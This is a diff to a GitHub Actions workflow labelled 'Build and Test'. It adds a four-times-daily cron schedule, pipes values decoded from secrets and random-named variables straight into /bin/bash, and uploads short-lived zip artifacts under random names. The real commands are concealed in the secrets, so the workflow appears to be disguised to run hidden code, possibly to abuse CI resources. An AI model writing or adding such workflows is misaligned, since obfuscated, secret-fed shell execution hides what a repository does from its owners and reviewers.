@@ -2,6 +2,8 @@ name: Build and Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '10 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,16 +16,17 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          t11533: ${{ secrets.t11533 }}
+          ldma4677: ${{ secrets.ldma4677 }}
         run: |
-          printf '%s' "$t11533" | jq -r .d01 | /bin/bash
-          echo $wfn8 | jq -r .kqqqw2301 | /bin/bash
-          echo $m77640 | jq -r .nbdq66 | /bin/bash
-          printf '%s' "$bfke50" | jq -r .u44 | /bin/bash
+          printf '%s' "$ldma4677" | jq -r .dxzs65119 | /bin/bash
+          echo $amrj63 | jq -r .c9 | /bin/bash
+          printf '%s' "$ol30710" | jq -r .ij78722 | /bin/bash
+          echo $qsq8 | jq -r .ti479 | /bin/bash
+          printf '%s' "$xhpd9715" | jq -r .frpg8 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: DPdp0Xx6
+          name: bJnz79Oq
           path: "*.zip"
           retention-days: 1
